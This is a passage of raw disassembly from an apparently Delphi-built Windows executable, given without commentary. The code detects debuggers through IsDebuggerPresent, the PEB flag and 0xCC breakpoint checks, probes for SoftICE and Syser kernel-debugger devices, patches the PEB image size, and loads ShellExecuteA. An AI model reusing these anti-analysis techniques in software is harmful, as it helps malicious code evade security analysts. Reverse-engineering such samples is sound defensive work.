  405601:	e8 de c4 ff ff       	call   0x401ae4
  405606:	c3                   	ret
  405607:	e9 00 c2 ff ff       	jmp    0x40180c
  40560c:	eb eb                	jmp    0x4055f9
  40560e:	8b c3                	mov    %ebx,%eax
  405610:	5f                   	pop    %edi
  405611:	5e                   	pop    %esi
  405612:	5b                   	pop    %ebx
  405613:	8b e5                	mov    %ebp,%esp
  405615:	5d                   	pop    %ebp
  405616:	c3                   	ret
  405617:	00 ff                	add    %bh,%bh
  405619:	ff                   	(bad)
  40561a:	ff                   	(bad)
  40561b:	ff 0b                	decl   (%ebx)
  40561d:	00 00                	add    %al,(%eax)
  40561f:	00 43 75             	add    %al,0x75(%ebx)
  405622:	72 72                	jb     0x405696
  405624:	65 6e                	outsb  %gs:(%esi),(%dx)
  405626:	74 55                	je     0x40567d
  405628:	73 65                	jae    0x40568f
  40562a:	72 00                	jb     0x40562c
  40562c:	53                   	push   %ebx
  40562d:	56                   	push   %esi
  40562e:	57                   	push   %edi
  40562f:	55                   	push   %ebp
  405630:	33 db                	xor    %ebx,%ebx
  405632:	68 60 56 40 00       	push   $0x405660
  405637:	e8 f4 df ff ff       	call   0x403630
  40563c:	8b f8                	mov    %eax,%edi
  40563e:	85 ff                	test   %edi,%edi
  405640:	74 17                	je     0x405659
  405642:	68 70 56 40 00       	push   $0x405670
  405647:	57                   	push   %edi
  405648:	e8 c3 df ff ff       	call   0x403610
  40564d:	8b e8                	mov    %eax,%ebp
  40564f:	89 ee                	mov    %ebp,%esi
  405651:	85 ed                	test   %ebp,%ebp
  405653:	74 04                	je     0x405659
  405655:	ff d6                	call   *%esi
  405657:	8b d8                	mov    %eax,%ebx
  405659:	8b c3                	mov    %ebx,%eax
  40565b:	5d                   	pop    %ebp
  40565c:	5f                   	pop    %edi
  40565d:	5e                   	pop    %esi
  40565e:	5b                   	pop    %ebx
  40565f:	c3                   	ret
  405660:	6b 65 72 6e          	imul   $0x6e,0x72(%ebp),%esp
  405664:	65 6c                	gs insb (%dx),%es:(%edi)
  405666:	33 32                	xor    (%edx),%esi
  405668:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40566b:	6c                   	insb   (%dx),%es:(%edi)
  40566c:	00 00                	add    %al,(%eax)
  40566e:	00 00                	add    %al,(%eax)
  405670:	49                   	dec    %ecx
  405671:	73 44                	jae    0x4056b7
  405673:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  405677:	67 65 72 50          	addr16 gs jb 0x4056cb
  40567b:	72 65                	jb     0x4056e2
  40567d:	73 65                	jae    0x4056e4
  40567f:	6e                   	outsb  %ds:(%esi),(%dx)
  405680:	74 00                	je     0x405682
  405682:	00 00                	add    %al,(%eax)
  405684:	55                   	push   %ebp
  405685:	8b ec                	mov    %esp,%ebp
  405687:	83 c4 f8             	add    $0xfffffff8,%esp
  40568a:	64 8b 05 30 00 00 00 	mov    %fs:0x30,%eax
  405691:	0f b6 40 02          	movzbl 0x2(%eax),%eax
  405695:	08 c0                	or     %al,%al
  405697:	74 02                	je     0x40569b
  405699:	75 07                	jne    0x4056a2
  40569b:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4056a2:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  4056a9:	83 7d f8 01          	cmpl   $0x1,-0x8(%ebp)
  4056ad:	75 02                	jne    0x4056b1
  4056af:	b2 01                	mov    $0x1,%dl
  4056b1:	83 7d fc 01          	cmpl   $0x1,-0x4(%ebp)
  4056b5:	75 02                	jne    0x4056b9
  4056b7:	33 d2                	xor    %edx,%edx
  4056b9:	8b c2                	mov    %edx,%eax
  4056bb:	59                   	pop    %ecx
  4056bc:	59                   	pop    %ecx
  4056bd:	5d                   	pop    %ebp
  4056be:	c3                   	ret
  4056bf:	90                   	nop
  4056c0:	53                   	push   %ebx
  4056c1:	33 db                	xor    %ebx,%ebx
  4056c3:	e8 64 ff ff ff       	call   0x40562c
  4056c8:	3c 01                	cmp    $0x1,%al
  4056ca:	74 09                	je     0x4056d5
  4056cc:	e8 b3 ff ff ff       	call   0x405684
  4056d1:	3c 01                	cmp    $0x1,%al
  4056d3:	75 02                	jne    0x4056d7
  4056d5:	b3 01                	mov    $0x1,%bl
  4056d7:	8b c3                	mov    %ebx,%eax
  4056d9:	5b                   	pop    %ebx
  4056da:	c3                   	ret
  4056db:	90                   	nop
  4056dc:	55                   	push   %ebp
  4056dd:	8b ec                	mov    %esp,%ebp
  4056df:	6a 00                	push   $0x0
  4056e1:	53                   	push   %ebx
  4056e2:	33 c0                	xor    %eax,%eax
  4056e4:	55                   	push   %ebp
  4056e5:	68 32 57 40 00       	push   $0x405732
  4056ea:	64 ff 30             	push   %fs:(%eax)
  4056ed:	64 89 20             	mov    %esp,%fs:(%eax)
  4056f0:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4056f3:	ba 48 57 40 00       	mov    $0x405748,%edx
  4056f8:	e8 5b c4 ff ff       	call   0x401b58
  4056fd:	6a 00                	push   $0x0
  4056ff:	ff 75 fc             	push   -0x4(%ebp)
  405702:	64 8b 05 30 00 00 00 	mov    %fs:0x30,%eax
  405709:	0f b6 40 02          	movzbl 0x2(%eax),%eax
  40570d:	08 c0                	or     %al,%al
  40570f:	75 04                	jne    0x405715
  405711:	31 c0                	xor    %eax,%eax
  405713:	c9                   	leave
  405714:	c3                   	ret
  405715:	b8 01 00 00 00       	mov    $0x1,%eax
  40571a:	c9                   	leave
  40571b:	c3                   	ret
  40571c:	33 c0                	xor    %eax,%eax
  40571e:	5a                   	pop    %edx
  40571f:	59                   	pop    %ecx
  405720:	59                   	pop    %ecx
  405721:	64 89 10             	mov    %edx,%fs:(%eax)
  405724:	68 39 57 40 00       	push   $0x405739
  405729:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40572c:	e8 8f c3 ff ff       	call   0x401ac0
  405731:	c3                   	ret
  405732:	e9 d5 c0 ff ff       	jmp    0x40180c
  405737:	eb f0                	jmp    0x405729
  405739:	8b c3                	mov    %ebx,%eax
  40573b:	5b                   	pop    %ebx
  40573c:	59                   	pop    %ecx
  40573d:	5d                   	pop    %ebp
  40573e:	c3                   	ret
  40573f:	00 ff                	add    %bh,%bh
  405741:	ff                   	(bad)
  405742:	ff                   	(bad)
  405743:	ff 06                	incl   (%esi)
  405745:	00 00                	add    %al,(%eax)
  405747:	00 44 41 45          	add    %al,0x45(%ecx,%eax,2)
  40574b:	4d                   	dec    %ebp
  40574c:	4f                   	dec    %edi
  40574d:	4e                   	dec    %esi
  40574e:	00 00                	add    %al,(%eax)
  405750:	55                   	push   %ebp
  405751:	8b ec                	mov    %esp,%ebp
  405753:	51                   	push   %ecx
  405754:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405757:	33 d2                	xor    %edx,%edx
  405759:	8b 75 fc             	mov    -0x4(%ebp),%esi
  40575c:	8a 06                	mov    (%esi),%al
  40575e:	3c cc                	cmp    $0xcc,%al
  405760:	74 04                	je     0x405766
  405762:	31 c0                	xor    %eax,%eax
  405764:	eb 05                	jmp    0x40576b
  405766:	b8 01 00 00 00       	mov    $0x1,%eax
  40576b:	8b c2                	mov    %edx,%eax
  40576d:	59                   	pop    %ecx
  40576e:	5d                   	pop    %ebp
  40576f:	c3                   	ret
  405770:	64 8b 05 30 00 00 00 	mov    %fs:0x30,%eax
  405777:	8b 40 0c             	mov    0xc(%eax),%eax
  40577a:	8b 40 0c             	mov    0xc(%eax),%eax
  40577d:	81 40 20 00 20 00 00 	addl   $0x2000,0x20(%eax)
  405784:	c3                   	ret
  405785:	8d 40 00             	lea    0x0(%eax),%eax
  405788:	53                   	push   %ebx
  405789:	33 db                	xor    %ebx,%ebx
  40578b:	6a 00                	push   $0x0
  40578d:	68 80 00 00 00       	push   $0x80
  405792:	6a 03                	push   $0x3
  405794:	6a 00                	push   $0x0
  405796:	6a 03                	push   $0x3
  405798:	68 00 00 00 c0       	push   $0xc0000000
  40579d:	50                   	push   %eax
  40579e:	e8 b5 dd ff ff       	call   0x403558
  4057a3:	83 f8 ff             	cmp    $0xffffffff,%eax
  4057a6:	74 08                	je     0x4057b0
  4057a8:	50                   	push   %eax
  4057a9:	e8 8a dd ff ff       	call   0x403538
  4057ae:	b3 01                	mov    $0x1,%bl
  4057b0:	8b c3                	mov    %ebx,%eax
  4057b2:	5b                   	pop    %ebx
  4057b3:	c3                   	ret
  4057b4:	53                   	push   %ebx
  4057b5:	33 db                	xor    %ebx,%ebx
  4057b7:	b8 e8 57 40 00       	mov    $0x4057e8,%eax
  4057bc:	e8 c7 ff ff ff       	call   0x405788
  4057c1:	84 c0                	test   %al,%al
  4057c3:	75 1c                	jne    0x4057e1
  4057c5:	b8 f4 57 40 00       	mov    $0x4057f4,%eax
  4057ca:	e8 b9 ff ff ff       	call   0x405788
  4057cf:	84 c0                	test   %al,%al
  4057d1:	75 0e                	jne    0x4057e1
  4057d3:	b8 04 58 40 00       	mov    $0x405804,%eax
  4057d8:	e8 ab ff ff ff       	call   0x405788
  4057dd:	84 c0                	test   %al,%al
  4057df:	74 02                	je     0x4057e3
  4057e1:	b3 01                	mov    $0x1,%bl
  4057e3:	8b c3                	mov    %ebx,%eax
  4057e5:	5b                   	pop    %ebx
  4057e6:	c3                   	ret
  4057e7:	00 5c 5c 2e          	add    %bl,0x2e(%esp,%ebx,2)
  4057eb:	5c                   	pop    %esp
  4057ec:	53                   	push   %ebx
  4057ed:	79 73                	jns    0x405862
  4057ef:	65 72 00             	gs jb  0x4057f2
  4057f2:	00 00                	add    %al,(%eax)
  4057f4:	5c                   	pop    %esp
  4057f5:	5c                   	pop    %esp
  4057f6:	2e 5c                	cs pop %esp
  4057f8:	53                   	push   %ebx
  4057f9:	79 73                	jns    0x40586e
  4057fb:	65 72 44             	gs jb  0x405842
  4057fe:	62 67 4d             	bound  %esp,0x4d(%edi)
  405801:	73 67                	jae    0x40586a
  405803:	00 5c 5c 2e          	add    %bl,0x2e(%esp,%ebx,2)
  405807:	5c                   	pop    %esp
  405808:	53                   	push   %ebx
  405809:	79 73                	jns    0x40587e
  40580b:	65 72 42             	gs jb  0x405850
  40580e:	6f                   	outsl  %ds:(%esi),(%dx)
  40580f:	6f                   	outsl  %ds:(%esi),(%dx)
  405810:	74 00                	je     0x405812
  405812:	00 00                	add    %al,(%eax)
  405814:	53                   	push   %ebx
  405815:	33 db                	xor    %ebx,%ebx
  405817:	6a 00                	push   $0x0
  405819:	68 80 00 00 00       	push   $0x80
  40581e:	6a 03                	push   $0x3
  405820:	6a 00                	push   $0x0
  405822:	6a 03                	push   $0x3
  405824:	68 00 00 00 c0       	push   $0xc0000000
  405829:	68 44 58 40 00       	push   $0x405844
  40582e:	e8 25 dd ff ff       	call   0x403558
  405833:	83 f8 ff             	cmp    $0xffffffff,%eax
  405836:	74 08                	je     0x405840
  405838:	50                   	push   %eax
  405839:	e8 fa dc ff ff       	call   0x403538
  40583e:	b3 01                	mov    $0x1,%bl
  405840:	8b c3                	mov    %ebx,%eax
  405842:	5b                   	pop    %ebx
  405843:	c3                   	ret
  405844:	5c                   	pop    %esp
  405845:	5c                   	pop    %esp
  405846:	2e 5c                	cs pop %esp
  405848:	53                   	push   %ebx
  405849:	49                   	dec    %ecx
  40584a:	43                   	inc    %ebx
  40584b:	45                   	inc    %ebp
  40584c:	00 00                	add    %al,(%eax)
  40584e:	00 00                	add    %al,(%eax)
  405850:	53                   	push   %ebx
  405851:	33 db                	xor    %ebx,%ebx
  405853:	6a 00                	push   $0x0
  405855:	68 80 00 00 00       	push   $0x80
  40585a:	6a 03                	push   $0x3
  40585c:	6a 00                	push   $0x0
  40585e:	6a 03                	push   $0x3
  405860:	68 00 00 00 c0       	push   $0xc0000000
  405865:	68 80 58 40 00       	push   $0x405880
  40586a:	e8 e9 dc ff ff       	call   0x403558
  40586f:	83 f8 ff             	cmp    $0xffffffff,%eax
  405872:	74 08                	je     0x40587c
  405874:	50                   	push   %eax
  405875:	e8 be dc ff ff       	call   0x403538
  40587a:	b3 01                	mov    $0x1,%bl
  40587c:	8b c3                	mov    %ebx,%eax
  40587e:	5b                   	pop    %ebx
  40587f:	c3                   	ret
  405880:	5c                   	pop    %esp
  405881:	5c                   	pop    %esp
  405882:	2e 5c                	cs pop %esp
  405884:	4e                   	dec    %esi
  405885:	54                   	push   %esp
  405886:	49                   	dec    %ecx
  405887:	43                   	inc    %ebx
  405888:	45                   	inc    %ebp
  405889:	00 00                	add    %al,(%eax)
  40588b:	00 53 33             	add    %dl,0x33(%ebx)
  40588e:	db e8                	fucomi %st(0),%st
  405890:	80 ff ff             	cmp    $0xff,%bh
  405893:	ff                   	(bad)
  405894:	3c 01                	cmp    $0x1,%al
  405896:	74 09                	je     0x4058a1
  405898:	e8 b3 ff ff ff       	call   0x405850
  40589d:	3c 01                	cmp    $0x1,%al
  40589f:	75 02                	jne    0x4058a3
  4058a1:	b3 01                	mov    $0x1,%bl
  4058a3:	8b c3                	mov    %ebx,%eax
  4058a5:	5b                   	pop    %ebx
  4058a6:	c3                   	ret
  4058a7:	90                   	nop
  4058a8:	55                   	push   %ebp
  4058a9:	8b ec                	mov    %esp,%ebp
  4058ab:	33 c0                	xor    %eax,%eax
  4058ad:	55                   	push   %ebp
  4058ae:	68 cd 58 40 00       	push   $0x4058cd
  4058b3:	64 ff 30             	push   %fs:(%eax)
  4058b6:	64 89 20             	mov    %esp,%fs:(%eax)
  4058b9:	ff 05 88 e9 40 00    	incl   0x40e988
  4058bf:	33 c0                	xor    %eax,%eax
  4058c1:	5a                   	pop    %edx
  4058c2:	59                   	pop    %ecx
  4058c3:	59                   	pop    %ecx
  4058c4:	64 89 10             	mov    %edx,%fs:(%eax)
  4058c7:	68 d4 58 40 00       	push   $0x4058d4
  4058cc:	c3                   	ret
  4058cd:	e9 3a bf ff ff       	jmp    0x40180c
  4058d2:	eb f8                	jmp    0x4058cc
  4058d4:	5d                   	pop    %ebp
  4058d5:	c3                   	ret
  4058d6:	8b c0                	mov    %eax,%eax
  4058d8:	83 2d 88 e9 40 00 01 	subl   $0x1,0x40e988
  4058df:	c3                   	ret
  4058e0:	53                   	push   %ebx
  4058e1:	56                   	push   %esi
  4058e2:	8b f0                	mov    %eax,%esi
  4058e4:	33 db                	xor    %ebx,%ebx
  4058e6:	6a 01                	push   $0x1
  4058e8:	6a 00                	push   $0x0
  4058ea:	6a 00                	push   $0x0
  4058ec:	6a 00                	push   $0x0
  4058ee:	56                   	push   %esi
  4058ef:	e8 14 de ff ff       	call   0x403708
  4058f4:	85 c0                	test   %eax,%eax
  4058f6:	74 14                	je     0x40590c
  4058f8:	b3 01                	mov    $0x1,%bl
  4058fa:	83 7e 04 12          	cmpl   $0x12,0x4(%esi)
  4058fe:	74 0c                	je     0x40590c
  405900:	56                   	push   %esi
  405901:	e8 1a de ff ff       	call   0x403720
  405906:	56                   	push   %esi
  405907:	e8 dc dd ff ff       	call   0x4036e8
  40590c:	6a 01                	push   $0x1
  40590e:	e8 65 dd ff ff       	call   0x403678
  405913:	8b c3                	mov    %ebx,%eax
  405915:	5e                   	pop    %esi
  405916:	5b                   	pop    %ebx
  405917:	c3                   	ret
  405918:	83 c4 e4             	add    $0xffffffe4,%esp
  40591b:	8b c4                	mov    %esp,%eax
  40591d:	e8 be ff ff ff       	call   0x4058e0
  405922:	84 c0                	test   %al,%al
  405924:	75 f5                	jne    0x40591b
  405926:	83 c4 1c             	add    $0x1c,%esp
  405929:	c3                   	ret
  40592a:	8b c0                	mov    %eax,%eax
  40592c:	55                   	push   %ebp
  40592d:	8b ec                	mov    %esp,%ebp
  40592f:	83 c4 e8             	add    $0xffffffe8,%esp
  405932:	53                   	push   %ebx
  405933:	56                   	push   %esi
  405934:	33 db                	xor    %ebx,%ebx
  405936:	89 5d e8             	mov    %ebx,-0x18(%ebp)
  405939:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  40593c:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  40593f:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  405942:	89 55 f8             	mov    %edx,-0x8(%ebp)
  405945:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405948:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40594b:	e8 e8 c5 ff ff       	call   0x401f38
  405950:	8b 45 f8             	mov    -0x8(%ebp),%eax
  405953:	e8 e0 c5 ff ff       	call   0x401f38
  405958:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40595b:	e8 d8 c5 ff ff       	call   0x401f38
  405960:	33 c0                	xor    %eax,%eax
  405962:	55                   	push   %ebp
  405963:	68 16 5a 40 00       	push   $0x405a16
  405968:	64 ff 30             	push   %fs:(%eax)
  40596b:	64 89 20             	mov    %esp,%fs:(%eax)
  40596e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405971:	e8 da c3 ff ff       	call   0x401d50
  405976:	8b f0                	mov    %eax,%esi
  405978:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40597b:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40597e:	e8 d5 c1 ff ff       	call   0x401b58
  405983:	8d 45 f0             	lea    -0x10(%ebp),%eax
  405986:	e8 35 c1 ff ff       	call   0x401ac0
  40598b:	8b 55 ec             	mov    -0x14(%ebp),%edx
  40598e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405991:	e8 96 c6 ff ff       	call   0x40202c
  405996:	8b d8                	mov    %eax,%ebx
  405998:	85 db                	test   %ebx,%ebx
  40599a:	74 45                	je     0x4059e1
  40599c:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40599f:	50                   	push   %eax
  4059a0:	8b cb                	mov    %ebx,%ecx
  4059a2:	49                   	dec    %ecx
  4059a3:	ba 01 00 00 00       	mov    $0x1,%edx
  4059a8:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4059ab:	e8 f4 c5 ff ff       	call   0x401fa4
  4059b0:	8b 55 e8             	mov    -0x18(%ebp),%edx
  4059b3:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4059b6:	e8 9d c3 ff ff       	call   0x401d58
  4059bb:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4059be:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4059c1:	e8 92 c3 ff ff       	call   0x401d58
  4059c6:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4059c9:	50                   	push   %eax
  4059ca:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4059cd:	e8 7e c3 ff ff       	call   0x401d50
  4059d2:	8b c8                	mov    %eax,%ecx
  4059d4:	8d 14 1e             	lea    (%esi,%ebx,1),%edx
  4059d7:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4059da:	e8 c5 c5 ff ff       	call   0x401fa4
  4059df:	eb 0b                	jmp    0x4059ec
  4059e1:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4059e4:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4059e7:	e8 6c c3 ff ff       	call   0x401d58
  4059ec:	85 db                	test   %ebx,%ebx
  4059ee:	75 9b                	jne    0x40598b
  4059f0:	8b 45 08             	mov    0x8(%ebp),%eax
  4059f3:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4059f6:	e8 19 c1 ff ff       	call   0x401b14
  4059fb:	33 c0                	xor    %eax,%eax
  4059fd:	5a                   	pop    %edx
  4059fe:	59                   	pop    %ecx
  4059ff:	59                   	pop    %ecx
  405a00:	64 89 10             	mov    %edx,%fs:(%eax)
  405a03:	68 1d 5a 40 00       	push   $0x405a1d
  405a08:	8d 45 e8             	lea    -0x18(%ebp),%eax
  405a0b:	ba 06 00 00 00       	mov    $0x6,%edx
  405a10:	e8 cf c0 ff ff       	call   0x401ae4
  405a15:	c3                   	ret
  405a16:	e9 f1 bd ff ff       	jmp    0x40180c
  405a1b:	eb eb                	jmp    0x405a08
  405a1d:	5e                   	pop    %esi
  405a1e:	5b                   	pop    %ebx
  405a1f:	8b e5                	mov    %ebp,%esp
  405a21:	5d                   	pop    %ebp
  405a22:	c2 04 00             	ret    $0x4
  405a25:	8d 40 00             	lea    0x0(%eax),%eax
  405a28:	55                   	push   %ebp
  405a29:	8b ec                	mov    %esp,%ebp
  405a2b:	83 c4 f8             	add    $0xfffffff8,%esp
  405a2e:	53                   	push   %ebx
  405a2f:	56                   	push   %esi
  405a30:	57                   	push   %edi
  405a31:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405a34:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405a37:	e8 fc c4 ff ff       	call   0x401f38
  405a3c:	33 c0                	xor    %eax,%eax
  405a3e:	55                   	push   %ebp
  405a3f:	68 c7 5a 40 00       	push   $0x405ac7
  405a44:	64 ff 30             	push   %fs:(%eax)
  405a47:	64 89 20             	mov    %esp,%fs:(%eax)
  405a4a:	c6 45 fb 00          	movb   $0x0,-0x5(%ebp)
  405a4e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405a51:	e8 ae 02 00 00       	call   0x405d04
  405a56:	84 c0                	test   %al,%al
  405a58:	74 57                	je     0x405ab1
  405a5a:	33 c0                	xor    %eax,%eax
  405a5c:	55                   	push   %ebp
  405a5d:	68 a7 5a 40 00       	push   $0x405aa7
  405a62:	64 ff 30             	push   %fs:(%eax)
  405a65:	64 89 20             	mov    %esp,%fs:(%eax)
  405a68:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405a6b:	e8 d8 c4 ff ff       	call   0x401f48
  405a70:	8b f0                	mov    %eax,%esi
  405a72:	56                   	push   %esi
  405a73:	e8 68 db ff ff       	call   0x4035e0
  405a78:	8b d8                	mov    %eax,%ebx
  405a7a:	80 e3 02             	and    $0x2,%bl
  405a7d:	80 e3 01             	and    $0x1,%bl
  405a80:	80 e3 04             	and    $0x4,%bl
  405a83:	33 c0                	xor    %eax,%eax
  405a85:	8a c3                	mov    %bl,%al
  405a87:	50                   	push   %eax
  405a88:	56                   	push   %esi
  405a89:	e8 d2 db ff ff       	call   0x403660
  405a8e:	56                   	push   %esi
  405a8f:	e8 04 db ff ff       	call   0x403598
  405a94:	83 f8 01             	cmp    $0x1,%eax
  405a97:	1b c0                	sbb    %eax,%eax
  405a99:	40                   	inc    %eax
  405a9a:	88 45 fb             	mov    %al,-0x5(%ebp)
  405a9d:	33 c0                	xor    %eax,%eax
  405a9f:	5a                   	pop    %edx
  405aa0:	59                   	pop    %ecx
  405aa1:	59                   	pop    %ecx
  405aa2:	64 89 10             	mov    %edx,%fs:(%eax)
  405aa5:	eb 0a                	jmp    0x405ab1
  405aa7:	e9 34 bc ff ff       	jmp    0x4016e0
  405aac:	e8 e7 bd ff ff       	call   0x401898
  405ab1:	33 c0                	xor    %eax,%eax
  405ab3:	5a                   	pop    %edx
  405ab4:	59                   	pop    %ecx
  405ab5:	59                   	pop    %ecx
  405ab6:	64 89 10             	mov    %edx,%fs:(%eax)
  405ab9:	68 ce 5a 40 00       	push   $0x405ace
  405abe:	8d 45 fc             	lea    -0x4(%ebp),%eax
  405ac1:	e8 fa bf ff ff       	call   0x401ac0
  405ac6:	c3                   	ret
  405ac7:	e9 40 bd ff ff       	jmp    0x40180c
  405acc:	eb f0                	jmp    0x405abe
  405ace:	8a 45 fb             	mov    -0x5(%ebp),%al
  405ad1:	5f                   	pop    %edi
  405ad2:	5e                   	pop    %esi
  405ad3:	5b                   	pop    %ebx
  405ad4:	59                   	pop    %ecx
  405ad5:	59                   	pop    %ecx
  405ad6:	5d                   	pop    %ebp
  405ad7:	c3                   	ret
  405ad8:	55                   	push   %ebp
  405ad9:	8b ec                	mov    %esp,%ebp
  405adb:	53                   	push   %ebx
  405adc:	56                   	push   %esi
  405add:	57                   	push   %edi
  405ade:	8b f9                	mov    %ecx,%edi
  405ae0:	8b f2                	mov    %edx,%esi
  405ae2:	8b d8                	mov    %eax,%ebx
  405ae4:	68 14 5b 40 00       	push   $0x405b14
  405ae9:	68 24 5b 40 00       	push   $0x405b24
  405aee:	e8 3d db ff ff       	call   0x403630
  405af3:	50                   	push   %eax
  405af4:	e8 17 db ff ff       	call   0x403610
  405af9:	8b 55 08             	mov    0x8(%ebp),%edx
  405afc:	52                   	push   %edx
  405afd:	8b 55 0c             	mov    0xc(%ebp),%edx
  405b00:	52                   	push   %edx
  405b01:	8b 55 10             	mov    0x10(%ebp),%edx
  405b04:	52                   	push   %edx
  405b05:	57                   	push   %edi
  405b06:	56                   	push   %esi
  405b07:	53                   	push   %ebx
  405b08:	ff d0                	call   *%eax
  405b0a:	5f                   	pop    %edi
  405b0b:	5e                   	pop    %esi
  405b0c:	5b                   	pop    %ebx
  405b0d:	5d                   	pop    %ebp
  405b0e:	c2 0c 00             	ret    $0xc
  405b11:	00 00                	add    %al,(%eax)
  405b13:	00 53 68             	add    %dl,0x68(%ebx)
  405b16:	65 6c                	gs insb (%dx),%es:(%edi)
  405b18:	6c                   	insb   (%dx),%es:(%edi)
  405b19:	45                   	inc    %ebp
  405b1a:	78 65                	js     0x405b81
  405b1c:	63 75 74             	arpl   %esi,0x74(%ebp)
  405b1f:	65 41                	gs inc %ecx
  405b21:	00 00                	add    %al,(%eax)
  405b23:	00 73 68             	add    %dh,0x68(%ebx)
  405b26:	65 6c                	gs insb (%dx),%es:(%edi)
  405b28:	6c                   	insb   (%dx),%es:(%edi)
  405b29:	33 32                	xor    (%edx),%esi
  405b2b:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  405b2e:	6c                   	insb   (%dx),%es:(%edi)
  405b2f:	00 55 8b             	add    %dl,-0x75(%ebp)
  405b32:	ec                   	in     (%dx),%al
  405b33:	6a 00                	push   $0x0
  405b35:	6a 00                	push   $0x0
  405b37:	53                   	push   %ebx
  405b38:	56                   	push   %esi
  405b39:	8b f2                	mov    %edx,%esi
  405b3b:	8b d8                	mov    %eax,%ebx
  405b3d:	33 c0                	xor    %eax,%eax
  405b3f:	55                   	push   %ebp
  405b40:	68 90 5b 40 00       	push   $0x405b90
  405b45:	64 ff 30             	push   %fs:(%eax)
  405b48:	64 89 20             	mov    %esp,%fs:(%eax)
  405b4b:	8d 45 fc             	lea    -0x4(%ebp),%eax
  405b4e:	ba a8 5b 40 00       	mov    $0x405ba8,%edx
  405b53:	e8 00 c0 ff ff       	call   0x401b58
  405b58:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405b5b:	8b d3                	mov    %ebx,%edx
  405b5d:	e8 f6 bf ff ff       	call   0x401b58
  405b62:	6a 00                	push   $0x0
  405b64:	56                   	push   %esi
  405b65:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  405b68:	8b 55 fc             	mov    -0x4(%ebp),%edx
  405b6b:	b8 01 00 00 80       	mov    $0x80000001,%eax
  405b70:	e8 13 05 00 00       	call   0x406088
  405b75:	33 c0                	xor    %eax,%eax
  405b77:	5a                   	pop    %edx
  405b78:	59                   	pop    %ecx
  405b79:	59                   	pop    %ecx
  405b7a:	64 89 10             	mov    %edx,%fs:(%eax)
  405b7d:	68 97 5b 40 00       	push   $0x405b97
  405b82:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405b85:	ba 02 00 00 00       	mov    $0x2,%edx
  405b8a:	e8 55 bf ff ff       	call   0x401ae4
  405b8f:	c3                   	ret
  405b90:	e9 77 bc ff ff       	jmp    0x40180c
  405b95:	eb eb                	jmp    0x405b82
  405b97:	5e                   	pop    %esi
  405b98:	5b                   	pop    %ebx
  405b99:	59                   	pop    %ecx
  405b9a:	59                   	pop    %ecx
  405b9b:	5d                   	pop    %ebp
  405b9c:	c3                   	ret
  405b9d:	00 00                	add    %al,(%eax)
  405b9f:	00 ff                	add    %bh,%bh
  405ba1:	ff                   	(bad)
  405ba2:	ff                   	(bad)
  405ba3:	ff 40 00             	incl   0x0(%eax)
  405ba6:	00 00                	add    %al,(%eax)
  405ba8:	53                   	push   %ebx
  405ba9:	4f                   	dec    %edi
  405baa:	46                   	inc    %esi
  405bab:	54                   	push   %esp
  405bac:	57                   	push   %edi
  405bad:	41                   	inc    %ecx
  405bae:	52                   	push   %edx
  405baf:	45                   	inc    %ebp
  405bb0:	5c                   	pop    %esp
  405bb1:	4d                   	dec    %ebp
  405bb2:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  405bb9:	74 5c                	je     0x405c17
  405bbb:	57                   	push   %edi
  405bbc:	69 6e 64 6f 77 73 5c 	imul   $0x5c73776f,0x64(%esi),%ebp
  405bc3:	43                   	inc    %ebx
  405bc4:	75 72                	jne    0x405c38
  405bc6:	72 65                	jb     0x405c2d
  405bc8:	6e                   	outsb  %ds:(%esi),(%dx)
  405bc9:	74 56                	je     0x405c21
  405bcb:	65 72 73             	gs jb  0x405c41
  405bce:	69 6f 6e 5c 45 78 70 	imul   $0x7078455c,0x6e(%edi),%ebp
  405bd5:	6c                   	insb   (%dx),%es:(%edi)
  405bd6:	6f                   	outsl  %ds:(%esi),(%dx)
  405bd7:	72 65                	jb     0x405c3e
  405bd9:	72 5c                	jb     0x405c37
  405bdb:	53                   	push   %ebx
  405bdc:	68 65 6c 6c 20       	push   $0x206c6c65
  405be1:	46                   	inc    %esi
  405be2:	6f                   	outsl  %ds:(%esi),(%dx)
  405be3:	6c                   	insb   (%dx),%es:(%edi)
  405be4:	64 65 72 73          	fs gs jb 0x405c5b
  405be8:	00 00                	add    %al,(%eax)
  405bea:	00 00                	add    %al,(%eax)
  405bec:	55                   	push   %ebp
  405bed:	8b ec                	mov    %esp,%ebp
  405bef:	6a 00                	push   $0x0
  405bf1:	53                   	push   %ebx
  405bf2:	8b d8                	mov    %eax,%ebx
  405bf4:	33 c0                	xor    %eax,%eax
  405bf6:	55                   	push   %ebp
  405bf7:	68 2f 5c 40 00       	push   $0x405c2f
